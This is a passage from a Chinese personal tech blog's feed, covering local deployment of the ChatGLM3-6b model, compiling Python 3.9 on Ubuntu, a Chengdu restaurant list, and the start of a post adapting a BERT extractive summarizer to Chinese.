cuDNN可以集成到更高级别的机器学习框架中，如谷歌的Tensorflow、torch</li></ul><p>需要注意的是，cuda、cudnn和我们常用的深度学习框架（如tensorflow-gpu、torch-gpu）之间的版本存在对应关系，如果配置错误则代码不能运行。</p><p>我们首先查看服务器上的显卡相关信息，在命令行输入：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nvidia-smi</span><br></pre></td></tr></table></figure><p>可以看到显卡支持的最高CUDA版本为11.8（<strong>注意这里是显卡支持的最高CUDA版本，而并不是目前系统安装的CUDA版本</strong>！）</p><p>同时可以看到这台服务器上装载了两个显存大小都为24G的GPU 0和1，其中GPU 0的显存几乎已经完全占满。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240122191115501.png" alt="image-20240122191115501"></p><p>输入以下命令，查看是否已经安装了cuda：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nvcc -V</span><br></pre></td></tr></table></figure><p>如果出现 <code>Command &#39;nvcc&#39; not found, but can be installed with:</code> 的输出，说明该服务器的系统并没有安装cuda</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240122193539449.png" alt="image-20240122193539449"></p><p>可以看到我这台服务器上面已经安装了cuda，版本为11.8，所以并不需要进行cuda和cudnn的安装</p><p><strong>如果你和我一样已经安装了cuda和cudnn，请跳转到下一部分，进行相对应torch-gpu的安装</strong></p><h3 id="cuda和cudnn的安装"><a href="#cuda和cudnn的安装" class="headerlink" title="cuda和cudnn的安装"></a>cuda和cudnn的安装</h3><p>这一部分我并没有进行，考虑后续有没有机会补上。</p><p>首先要创建一个Python ≥ 3.10的虚拟环境（chatglm3-6b要求）。</p><p>要注意虚拟环境中的cuda和系统中的cuda的区别，我这里的cuda就是直接安装在系统中，所有的虚拟环境都可以使用系统中安装的cuda</p><p>在虚拟环境中安装并使用其他版本的cuda，参考：<a href="https://blog.csdn.net/2301_80501457/article/details/134191613">https://blog.csdn.net/2301_80501457/article/details/134191613</a></p><blockquote><p>要注意：如果你的cuda是直接安装在虚拟环境中，并非直接安装在系统中。是无法使用ncvv -V命令验证是否安装成功的，ncvv -V是通过系统变量来直接查询，而安装在虚拟环境中并没有直接建立系统变量。验证方法可以见上面链接的最后一部分。</p></blockquote><h2 id="pytorch-gpu的安装"><a href="#pytorch-gpu的安装" class="headerlink" title="pytorch-gpu的安装"></a>pytorch-gpu的安装</h2><p>pytorch-gpu的版本同样必须依赖于CUDA的版本。</p><p>注意，<code>conda install pytorch</code> 命令安装的是torch CPU版本，但是我们要使用GPU进行训练</p><p>在<a href="https://pytorch.org/get-started/previous-versions/">pytorch官网</a>上获取cuda11.8对应版本torch的安装命令</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240122103348292.png" alt="image-20240122103348292"></p><p>复制对应的命令，执行安装</p><p>安装完成后编写程序如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch <span class="comment"># 如果pytorch安装成功即可导入</span></span><br><span class="line"><span class="built_in">print</span>(torch.cuda.is_available()) <span class="comment"># 查看CUDA是否可用</span></span><br><span class="line"><span class="built_in">print</span>(torch.cuda.device_count()) <span class="comment"># 查看可用的CUDA数量</span></span><br><span class="line"><span class="built_in">print</span>(torch.version.cuda) <span class="comment"># 查看CUDA版本</span></span><br></pre></td></tr></table></figure><p>运行结果如下：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240122195902702.png" alt="image-20240122195902702"></p><p>已经配置成功</p><h2 id="安装剩余依赖"><a href="#安装剩余依赖" class="headerlink" title="安装剩余依赖"></a>安装剩余依赖</h2><p>clone下来ChatGLM3项目</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/THUDM/ChatGLM3.git</span><br></pre></td></tr></table></figure><blockquote><p>超时的话挂梯子设置代理，使用服务器没办法挂梯子的话直接在github下载zip上传到服务器上</p></blockquote><p>由于已经安装了torch，所以我们要<strong>删掉项目目录下requirements.txt中的 <em>torch&gt;&#x3D;2.1.0</em> 一行</strong></p><p>并使用 pip 安装剩余的依赖</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure><blockquote><p>这里一定要删除torch相关依赖行！！不然会自动给你下载冲突的torch版本，后续项目报错</p></blockquote><h1 id="下载ChatGLM3-6b模型及参数"><a href="#下载ChatGLM3-6b模型及参数" class="headerlink" title="下载ChatGLM3-6b模型及参数"></a>下载ChatGLM3-6b模型及参数</h1><h2 id="方法1：从-Hugging-Face-Hub-下载模型"><a href="#方法1：从-Hugging-Face-Hub-下载模型" class="headerlink" title="方法1：从 Hugging Face Hub 下载模型"></a>方法1：从 Hugging Face Hub 下载模型</h2><p>首先需要安装Git LFS，否则会出现模型中的大型文件下载不完整的情况。</p><p>输入以下命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git lfs install</span><br></pre></td></tr></table></figure><p>若显示 <code>Git LFS initialized</code> ，说明已经安装。</p><p>可以使用git进行克隆，运行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://huggingface.co/THUDM/chatglm3-6b</span><br></pre></td></tr></table></figure><p>如果下载比较慢或者超时，可以直接去<a href="https://huggingface.co/THUDM/chatglm3-6b">官网</a>下载模型再上传到服务器</p><h2 id="方法2：从-ModelScope-下载模型（推荐）"><a href="#方法2：从-ModelScope-下载模型（推荐）" class="headerlink" title="方法2：从 ModelScope 下载模型（推荐）"></a>方法2：从 ModelScope 下载模型（推荐）</h2><p>同样也可以在国内魔搭社区下载，一般不会超时</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git lfs install</span><br><span class="line">git clone https://www.modelscope.cn/ZhipuAI/chatglm3-6b.git</span><br></pre></td></tr></table></figure><blockquote><p>注意，这里一定要<code>git lfs install</code>，虽然我查了这个命令仅仅只是用于验证是否安装了git lfs，但是我第一次从魔搭git clone的时候，没有使用这个命令产生了大文件下载不完整的情况，加上后没有再出现这样的问题，所以建议还是加上吧。</p></blockquote><h1 id="代码调用模型进行预测"><a href="#代码调用模型进行预测" class="headerlink" title="代码调用模型进行预测"></a>代码调用模型进行预测</h1><p>下载完成模型及参数文件后，我们将所有的文件放在一个文件夹<code>chatglm3-6b</code>里，然后将其放在项目文件夹ChatGLM3-main下</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240122202232999.png" alt="image-20240122202232999"></p><p>然后我们可以在项目主目录下创建test.py文件，通过如下代码调用 ChatGLM 模型来生成对话：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> transformers <span class="keyword">import</span> AutoTokenizer, AutoModel</span><br><span class="line"></span><br><span class="line">tokenizer = AutoTokenizer.from_pretrained(<span class="string">&quot;chatglm3-6b/&quot;</span>, trust_remote_code=<span class="literal">True</span>)</span><br><span class="line">model = AutoModel.from_pretrained(<span class="string">&quot;chatglm3-6b/&quot;</span>, trust_remote_code=<span class="literal">True</span>, device=<span class="string">&#x27;cuda&#x27;</span>)</span><br><span class="line">model = model.<span class="built_in">eval</span>()</span><br><span class="line">response, history = model.chat(tokenizer, <span class="string">&quot;你好&quot;</span>, history=[])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;回答：&quot;</span>,response)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 需要根据上下文的情况下</span></span><br><span class="line"><span class="comment"># response, history = model.chat(tokenizer, &quot;晚上睡不着应该怎么办&quot;, history=history)</span></span><br><span class="line"><span class="comment"># print(response)</span></span><br></pre></td></tr></table></figure><blockquote><p>这里使用”chatglm3-6b&#x2F;“就是加载了该文件夹下的本地模型及文件</p></blockquote><p>在命令行输入，执行代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CUDA_VISIBLE_DEVICES=1 python test.py</span><br></pre></td></tr></table></figure><blockquote><p>注意，这里的 <code>CUDA_VISIBLE_DEVICES=1</code> 的作用是指定使用 GPU 1 来跑模型，因为我们前面已经通过 <code>nvidia-smi</code> 知道 GPU 0 的显存已经基本占满了</p><p>cuda指定GPU、设置多GPU的方法：<a href="https://blog.csdn.net/OneQuestionADay/article/details/111691486">https://blog.csdn.net/OneQuestionADay/article/details/111691486</a></p></blockquote><h1 id="构建网页版demo"><a href="#构建网页版demo" class="headerlink" title="构建网页版demo"></a>构建网页版demo</h1><p>官方教程：<a href="https://github.com/THUDM/ChatGLM3/blob/main/composite_demo/README.md">https://github.com/THUDM/ChatGLM3/blob/main/composite_demo/README.md</a></p><p>安装 Jupyter 内核：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipython kernel install --name chatglm3-demo --user</span><br></pre></td></tr></table></figure><p>因为我们是本地下载的模型，所以需要先设置环境变量 <code>MODEL_PATH</code> 来指定从本地加载模型</p><p>直接在终端中输入如下命令即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export MODEL_PATH=//home/xjb/event/ChatGLM3-main/chatglm3-6b</span><br></pre></td></tr></table></figure><p>然后输入命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CUDA_VISIBLE_DEVICES=1 streamlit run composite_demo/main.py</span><br></pre></td></tr></table></figure><blockquote><p>注意这里一样要在命令的前面加上 <code>CUDA_VISIBLE_DEVICES=1</code> 来设置使用的GPU</p></blockquote><p>运行结果：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240122204008879.png" alt="image-20240122204008879"></p><p>如果你部署在了服务器上而不是本机，访问对应的network url既可使用网页demo</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240122204313569.png" alt="image-20240122204313569"></p><p>现在你就拥有一个属于自己的本地大模型啦，因为该模型较轻量级，预测的速度还是比较快的，在未经过微调的情况下我直接将其用于新闻文本的摘要任务，大概1-2秒可以生成一篇文本的摘要，效果也比较不错，但是偶尔会出现中英文乱码的情况。</p><p>你也可以对其进行进一步的领域微调，使其更适合你的任务。</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><ul><li><p><a href="https://blog.csdn.net/qq_43705697/article/details/121618276">https://blog.csdn.net/qq_43705697/article/details/121618276</a></p></li><li><p><a href="https://blog.csdn.net/2301_80501457/article/details/134191613">https://blog.csdn.net/2301_80501457/article/details/134191613</a></p></li><li><p><a href="https://blog.csdn.net/m0_65814643/article/details/134510135?spm=1001.2014.3001.5501">https://blog.csdn.net/m0_65814643/article/details/134510135?spm=1001.2014.3001.5501</a></p></li><li><p><a href="https://blog.csdn.net/m0_65814643/article/details/134563092">https://blog.csdn.net/m0_65814643/article/details/134563092</a></p></li><li><p><a href="https://blog.csdn.net/OneQuestionADay/article/details/111691486">https://blog.csdn.net/OneQuestionADay/article/details/111691486</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 工程记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 大模型 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『linux』ubuntu修改python版本</title>
      <link href="/posts/3bee.html"/>
      <url>/posts/3bee.html</url>
      
        <content type="html"><![CDATA[<p><strong>motivation：</strong></p><p>服务器系统为：ubuntu20.04</p><p>查看系统中自带的python版本，可以发现系统自带的python3版本为python3.8。</p><p>因为我们需要在服务器部署的项目依赖python版本&gt;&#x3D;3.9，与Python3.8不兼容，所以需要安装python3.9。</p><p>本文详细记录在Ubuntu20.04（其他版本步骤也一样）上编译安装指定版本Python解释器的过程和可能遇到的问题，及多个Python版本并存的使用方法。</p><h1 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h1><p>初次安装的时候，没有执行这个步骤，后续踩了比较多的坑，参考网上的文章后执行此步骤可以解决大部分的问题。</p><h2 id="更新系统软件"><a href="#更新系统软件" class="headerlink" title="更新系统软件"></a>更新系统软件</h2><p>在正式开始之前，建议首先检查系统软件是否均为最新，并更新到最新版本。</p><p>打开一个终端，输入以下命令：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 刷新软件包目录</span><br><span class="line">sudo apt update</span><br><span class="line"># 列出当前可用的更新</span><br><span class="line">sudo apt list --upgradable</span><br><span class="line"># 如上一步提示有可以更新的项目，则执行更新</span><br><span class="line">sudo apt upgrade</span><br></pre></td></tr></table></figure><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240111170901524.png" alt="image-20240111170901524"></p><h2 id="安装GCC编译器"><a href="#安装GCC编译器" class="headerlink" title="安装GCC编译器"></a>安装GCC编译器</h2><p>打开一个终端，使用 apt 安装 GCC 编译器：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装 GCC 编译器</span></span><br><span class="line">sudo apt install gcc</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查安装是否成功</span></span><br><span class="line">gcc -v</span><br><span class="line"><span class="comment"># 若显示出 GCC 版本则成功</span></span><br></pre></td></tr></table></figure><h2 id="安装其他依赖"><a href="#安装其他依赖" class="headerlink" title="安装其他依赖"></a>安装其他依赖</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 刷新软件包目录</span></span><br><span class="line">sudo apt update</span><br><span class="line"><span class="comment"># 安装依赖</span></span><br><span class="line">sudo apt install build-essential zlib1g-dev libncurses5-dev libgdbm-dev libnss3-dev libssl-dev libreadline-dev libffi-dev libbz2-dev liblzma-dev sqlite3 libsqlite3-dev tk-dev uuid-dev libgdbm-compat-dev</span><br></pre></td></tr></table></figure><p>注意，Python 的部分功能依赖于对应的库（如 OpenSSL、SQLite3、LZMA 等），如果在编译时未能找到这些库，仍然可能完成编译。此时的 Python 解释器看似可以工作，但在需要使用特定功能时就会出问题。例如 OpenSSL 出现问题会导致无法正常使用 pip。故建议按本节提示安装所有可选依赖项。</p><h1 id="查看系统自带python3版本"><a href="#查看系统自带python3版本" class="headerlink" title="查看系统自带python3版本"></a>查看系统自带python3版本</h1><p>在系统终端中输入：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l /usr/bin | grep python</span><br></pre></td></tr></table></figure><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240111165216118.png" alt="image-20240111165216118"></p><p>可以看出使用系统的Python3指向版本python3.8</p><p>输入python3 –version可以查看详细版本信息</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240111165421131.png" alt="image-20240111165421131"></p><h1 id="下载安装python3-9"><a href="#下载安装python3-9" class="headerlink" title="下载安装python3.9"></a>下载安装python3.9</h1><h2 id="下载与解压"><a href="#下载与解压" class="headerlink" title="下载与解压"></a>下载与解压</h2><p>在<a href="https://www.python.org/ftp/python/%E4%B8%8B%E6%89%BE%E5%88%B0%E6%88%91%E4%BB%AC%E6%83%B3%E8%A6%81%E5%AE%89%E8%A3%85%E7%9A%84python3.9%E7%89%88%E6%9C%AC%E7%9A%84tgz%E5%AE%89%E8%A3%85%E5%8C%85">https://www.python.org/ftp/python/下找到我们想要安装的python3.9版本的tgz安装包</a></p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240111165757616.png" alt="image-20240111165757616"></p><p>在终端中通过wget命令下载我们选择的安装包</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo wget https://www.python.org/ftp/python/<span class="number">3</span>.<span class="number">9</span>.<span class="number">0</span>/Python-<span class="number">3</span>.<span class="number">9</span>.<span class="number">0</span>.tgz</span><br></pre></td></tr></table></figure><p>解压安装包并进入目录（我这里选择解压到根目录下，读者可以自行选择解压路径）</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo tar -zxvf Python-<span class="number">3</span>.<span class="number">9</span>.<span class="number">0</span>.tgz -C ~</span><br><span class="line"><span class="built_in">cd</span> Python-<span class="number">3</span>.<span class="number">8</span>.<span class="number">5</span></span><br></pre></td></tr></table></figure><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>在Python-3.8.5目录下：</p><p>配置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./configure</span><br></pre></td></tr></table></figure><p>编译：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make</span><br></pre></td></tr></table></figure><p>安装：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo make altinstall</span><br></pre></td></tr></table></figure><blockquote><p>这里使用应使用 <code>altinstall</code> 而不是 <code>install</code> 。</p><p>二者的一个重要区别在于，后者会创建符号链接，将 <code>python3</code> 等命令链接到正在安装的新版本 Python 3 上，这可能会破坏系统。更多信息请参阅当前目录下的 <code>README.rst</code> 文件。</p></blockquote><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p><strong>有的文章可能会在这里让你删除掉原有的python环境或者是修改python3命令指向新安装的python3.8环境，由于 Ubuntu 系统、安装的其他软件等很可能会依赖于系统原有的python环境等原因，都不要进行此类修改！！！</strong></p><p>下面对安装完成的python环境进行测试</p><p>在命令行输入python3.9（注意不要分开），可以看到已经成功安装了。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240111172737068.png" alt="image-20240111172737068"></p><p>如果要在python3.9环境下安装库的话，使用pip3.9即可</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240111173117603.png" alt="image-20240111173117603"></p><p>后续如果想用python3.9环境来执行代码的话，在前面加上python3.9即可</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240111173227176.png" alt="image-20240111173227176"></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><ul><li><a href="https://zhuanlan.zhihu.com/p/506491209">https://zhuanlan.zhihu.com/p/506491209</a></li><li></li></ul>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> unbuntu </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『探店』成都探店</title>
      <link href="/posts/1e32.html"/>
      <url>/posts/1e32.html</url>
      
        <content type="html"><![CDATA[<p>在成都求学的这几年间吃过的一些比较好吃的店铺。</p><h1 id="川菜"><a href="#川菜" class="headerlink" title="川菜"></a>川菜</h1><h2 id="鸡毛店"><a href="#鸡毛店" class="headerlink" title="鸡毛店"></a>鸡毛店</h2><ul><li><p>地点：天府宏</p></li><li><p>人均：50</p></li><li><p>评价：去过好几次了，味道很不错，注意有的店也叫鸡毛店但不一样，我一般常去天府宏的</p></li><li><p>推荐菜：</p><ul><li><p>蒜蓉生焖虾：必点，非常好吃</p></li><li><p>鸡丝凉面</p></li></ul></li></ul><h2 id="明婷饭店"><a href="#明婷饭店" class="headerlink" title="明婷饭店"></a>明婷饭店</h2><ul><li>地点：去过两个分店，都还可以</li><li>人均：60</li><li>评价：便宜，味道很不错，性价比高。</li><li>推荐菜：<ul><li>脑花豆腐：必点，特别下饭</li><li>奇香排骨：招牌</li></ul></li></ul><h2 id="陈麻婆豆腐"><a href="#陈麻婆豆腐" class="headerlink" title="陈麻婆豆腐"></a>陈麻婆豆腐</h2><ul><li>地点：总店在杜甫草堂对面</li><li>人均：60</li><li>评价：麻婆豆腐非常好吃，其他菜一般般。建议去总店！</li><li>推荐菜：<ul><li>麻婆豆腐，非遗</li></ul></li></ul><h2 id="永乐饭店"><a href="#永乐饭店" class="headerlink" title="永乐饭店"></a>永乐饭店</h2><ul><li>地点：武侯区</li><li>人均：50</li><li>评价：便宜好吃，网上评价都比较好，暂时没吃过</li><li>推荐菜：<ul><li>照着招牌点就行</li></ul></li></ul><h1 id="翘脚牛肉"><a href="#翘脚牛肉" class="headerlink" title="翘脚牛肉"></a>翘脚牛肉</h1><h2 id="冯四嬢翘脚牛肉"><a href="#冯四嬢翘脚牛肉" class="headerlink" title="冯四嬢翘脚牛肉"></a>冯四嬢翘脚牛肉</h2><ul><li>地点：世豪广场</li><li>人均：30</li><li>评价：价格比较便宜，牛肉很新鲜。</li><li>推荐菜：<ul><li>翘脚牛肉</li><li>鲜血旺</li><li>粉蒸牛肉</li></ul></li></ul><h1 id="烧烤"><a href="#烧烤" class="headerlink" title="烧烤"></a>烧烤</h1><h2 id="新奥尔良烧烤"><a href="#新奥尔良烧烤" class="headerlink" title="新奥尔良烧烤"></a>新奥尔良烧烤</h2><ul><li>地点：这家店地图上搜不到，可以搜索玉林西路的生火火地摊小炉子烧烤，在对面</li><li>人均：60</li><li>评价：烤翅神中神，其他的也不错</li><li>推荐菜：<ul><li>烤翅</li><li>让老板娘帮着拿，都不错</li></ul></li></ul><h1 id="美蛙鱼"><a href="#美蛙鱼" class="headerlink" title="美蛙鱼"></a>美蛙鱼</h1><h2 id="蓉城霜霜"><a href="#蓉城霜霜" class="headerlink" title="蓉城霜霜"></a>蓉城霜霜</h2><ul><li>地点：连锁店，哪里都有</li><li>人均：60</li><li>评价：自助，吃美蛙鱼就去这</li></ul><h1 id="冒烤鸭"><a href="#冒烤鸭" class="headerlink" title="冒烤鸭"></a>冒烤鸭</h1><h2 id="回味冒烤鸭"><a href="#回味冒烤鸭" class="headerlink" title="回味冒烤鸭"></a>回味冒烤鸭</h2><ul><li>地点：回味冒烤鸭（川大店）</li><li>人均：20</li><li>评价：价格便宜，好吃</li></ul><h1 id="火锅"><a href="#火锅" class="headerlink" title="火锅"></a>火锅</h1><p>感觉火锅味道都差不多？</p><h2 id="矮板凳"><a href="#矮板凳" class="headerlink" title="矮板凳"></a>矮板凳</h2><ul><li>地点：连锁，哪里都有</li><li>人均：70</li><li>评价：实验室聚餐去吃过几次，味道还可以，价格也还行</li></ul><h2 id="星鸿社"><a href="#星鸿社" class="headerlink" title="星鸿社"></a>星鸿社</h2><ul><li>地点：建设路&#x2F;电子科技大学</li><li>人均：100+</li><li>评价：一家重庆老火锅，味道很好，但是价格比较贵。</li></ul><h1 id="串串"><a href="#串串" class="headerlink" title="串串"></a>串串</h1><h2 id="六年二班串串"><a href="#六年二班串串" class="headerlink" title="六年二班串串"></a>六年二班串串</h2><ul><li><p>地点：人民公园店</p></li><li><p>人均：40</p></li><li><p>评价：成都朋友推荐，还没去过。</p></li></ul><h1 id="小龙虾"><a href="#小龙虾" class="headerlink" title="小龙虾"></a>小龙虾</h1><h2 id="龙虾一绝"><a href="#龙虾一绝" class="headerlink" title="龙虾一绝"></a>龙虾一绝</h2><ul><li>地点：玉林西路</li><li>人均：70</li><li>评价：本地人舍友推荐的一家龙虾店，去吃过一次，价格较贵，感觉一般般，也有可能是我点的是微辣的原因。</li></ul><h1 id="小吃"><a href="#小吃" class="headerlink" title="小吃"></a>小吃</h1><h2 id="建设北路"><a href="#建设北路" class="headerlink" title="建设北路"></a>建设北路</h2><ul><li><p>烤苕皮</p></li><li><p>油条糯米糍（不叫这个，具体叫啥忘了）：个人觉得非常好吃，每次去都买一个肉松味的。</p></li><li><p>冰粉：一般吃火锅买一个。</p></li><li><p>冰豆花</p></li><li><p>蛋烘糕</p></li><li><p>成都市很好吃的火锅粉：推荐脑花、火锅粉。</p></li><li><p>钵钵鸡</p></li><li><p>担担面</p></li></ul><h2 id="宽菜日记"><a href="#宽菜日记" class="headerlink" title="宽菜日记"></a>宽菜日记</h2><ul><li>推荐菜：<ul><li>甜皮鸭：建议买来后1-2小时内吃，放久了就不好吃了。</li></ul></li></ul><h2 id="蹄花"><a href="#蹄花" class="headerlink" title="蹄花"></a>蹄花</h2><ul><li><p>吴氏蹄花：川大望江校区附近，便宜好吃，推荐雪豆蹄花汤+铁板烧。</p></li><li><p>无名蹄花：大众点评必吃榜上的，暂时没吃过。</p></li></ul><h1 id="不推荐"><a href="#不推荐" class="headerlink" title="不推荐"></a>不推荐</h1><h2 id="陶德砂锅"><a href="#陶德砂锅" class="headerlink" title="陶德砂锅"></a>陶德砂锅</h2><p>网红店。很一般，本地人都不推荐的店</p><h2 id="烤匠"><a href="#烤匠" class="headerlink" title="烤匠"></a>烤匠</h2><p>本人去过好几次，感觉也是比较一般，而且偏贵，推荐菜：芝士烤红薯</p><h2 id="冒椒火辣"><a href="#冒椒火辣" class="headerlink" title="冒椒火辣"></a>冒椒火辣</h2><p>网红店。小菜很好吃（脑花好吃），但是串串感觉味道很一般，偏贵</p><h2 id="饕林餐厅"><a href="#饕林餐厅" class="headerlink" title="饕林餐厅"></a>饕林餐厅</h2><p>网红店。个人觉得很一般，而且偏贵。</p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 美食 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『工程记录』修改bert-extractive-summarizer项目用于中文文本摘要任务</title>
      <link href="/posts/fbe6.html"/>
      <url>/posts/fbe6.html</url>
      
        <content type="html"><![CDATA[<h1 id="motivation"><a href="#motivation" class="headerlink" title="motivation"></a>motivation</h1><p>本文为bert-extractive-summarizer项目改中文模型记录</p><ul><li><p>主页文档：<a href="https://pypi.org/project/bert-extractive-summarizer/">https://pypi.org/project/bert-extractive-summarizer/</a></p></li><li><p>github项目地址：<a href="https://github.com/dmmiller612/bert-extractive-summarizer">https://github.com/dmmiller612/bert-extractive-summarizer</a></p></li></ul><p>该模型的原理在于：通过bert生成句子嵌入，对句子嵌入做聚类，找到最接近聚类质心的句子，同时使用<a href="https://github.com/huggingface/neuralcoref">neuralcoref</a>库实现共指消解功能（比较符合目前的业务，项目数据集中的政治新闻大多系外媒台媒文章，不像国内的文章那样规范，行文比较随意，同时因为外文翻译为中文存在一些语句翻译质量低，所以存在很多的指代问题）</p><p>发现原始模型做的是英文的摘要生成，要进行中文摘要需要将其修改成中文的Bert模型和分词器，参考作者给出的<a href="https://geek.digiasset.org/pages/nlp/nlpinfo/bert-text-summarizer-chinese/">中文模型文档</a>和github下的<a href="https://github.com/dmmiller612/bert-extractive-summarizer/issues/45">issue</a>完成了中文摘要的提取。</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><h2 id="spacy-neuralcoref-搭建共指消解环境"><a href="#spacy-neuralcoref-搭建共指消解环境" class="headerlink" title="spacy + neuralcoref 搭建共指消解环境"></a>spacy + neuralcoref 搭建共指消解环境</h2><p>指代消解任务通过<code>spacy + uralcoref</code>实现。spacy是一个NLP领域的文本预处理Python库，包括分词、词性标注、依存分析等多个nlp基础任务的实现，neuralcoref相当于一个插件，在spacy框架下实现指代消解。</p><p>我在初次安装过程中<strong>出现了Spacy和neuralcoref的版本适配问题</strong>，安装很多版本都不能顺利运行，各种error。最终找到一个匹配的安装方式，按照下面的流程来进行安装的话应该不会出现兼容性的问题。</p><p>如果你是<strong>英文任务</strong>的话，推荐：<strong>spacy 2.1.0 + neuralcoref 4.0 + en_core_web_sm-2.1.0</strong></p><blockquote><p>但是这一套对中文模型版本并不适用， neuralcoref并不支持中文共指消解。所以对中文任务而言，如果要使用这里的共指消解，需要使用其他的支持中文的共指消解工具。</p><p>因此<strong>我们后面的中文摘要生成部分并没有使用共指消解，后续有机会可以尝试加上</strong></p></blockquote><p>我们先pip install spacy&#x3D;&#x3D;2.1.0，前面提到neuralcoref相当于spaCy的一个插件，所以先安装neuralcoref会自动帮我们安装 spacy，可能会产生版本冲突。</p><p>接下来安装spacy 2.1.0版本库上的 transformer-based pipelines 的预训练模型 en_core_web_sm-2.1.0，<strong>注意这里的版本一定要和前面的spacy一样</strong>，产生报错建议手动安装 </p><p>安装完spacy后安装neuralcoref，<strong>建议这里去pypi上找到对应的 <a href="https://pypi.org/project/neuralcoref/#files">neuralcoref包</a> 下载到本地后手动安装</strong>，不然可能会产生下面的报错：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20231215165152653.png" alt="image-20231215165152653"></p><h2 id="搭建-bert-extractive-summarizer-环境"><a 